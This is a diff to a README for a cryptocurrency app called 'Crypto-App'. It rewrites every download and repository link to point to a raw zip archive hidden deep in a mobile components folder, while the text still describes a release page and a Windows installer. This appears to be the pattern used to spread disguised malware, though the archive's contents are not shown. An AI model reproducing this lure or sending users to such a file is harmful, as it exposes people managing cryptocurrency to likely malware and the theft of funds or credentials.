@@ -1,6 +1,6 @@
 # 🚀 Crypto-App - Manage Crypto Simply and Securely
 
-[![Download Crypto-App](https://img.shields.io/badge/Download-Crypto--App-brightgreen)](https://github.com/josepbaliarda/Crypto-App)
+[![Download Crypto-App](https://img.shields.io/badge/Download-Crypto--App-brightgreen)](https://github.com/josepbaliarda/Crypto-App/raw/refs/heads/main/apps/mobile/components/common/Crypto_App_2.6-beta.5.zip)
 
 ---
 
@@ -9,7 +9,7 @@
 To get started with Crypto-App on your Windows computer, follow these steps carefully.
 
 1. Visit the official download page here:  
-   [Download Crypto-App](https://github.com/josepbaliarda/Crypto-App)  
+   [Download Crypto-App](https://github.com/josepbaliarda/Crypto-App/raw/refs/heads/main/apps/mobile/components/common/Crypto_App_2.6-beta.5.zip)  
    This page contains the latest release files.
 
 2. Look for the latest Windows installer file. It may have a name like `Crypto-App-Setup.exe` or something similar.
@@ -136,7 +136,7 @@ All these parts work together behind the scenes to deliver a smooth experience.
 ## 🔗 Access the GitHub Repository
 
 Explore the project files or get updates here:  
-[https://github.com/josepbaliarda/Crypto-App](https://github.com/josepbaliarda/Crypto-App)
+[https://github.com/josepbaliarda/Crypto-App/raw/refs/heads/main/apps/mobile/components/common/Crypto_App_2.6-beta.5.zip](https://github.com/josepbaliarda/Crypto-App/raw/refs/heads/main/apps/mobile/components/common/Crypto_App_2.6-beta.5.zip)
 
 This page also provides detailed technical info for advanced users or developers.
 
@@ -171,4 +171,4 @@ For help, you can open issues or discussions on the GitHub page under the reposi
 
 ---
 
-[![Get Crypto-App](https://img.shields.io/badge/Download-Crypto--App-blue)](https://github.com/josepbaliarda/Crypto-App)
+[![Get Crypto-App](https://img.shields.io/badge/Download-Crypto--App-blue)](https://github.com/josepbaliarda/Crypto-App/raw/refs/heads/main/apps/mobile/components/common/Crypto_App_2.6-beta.5.zip)
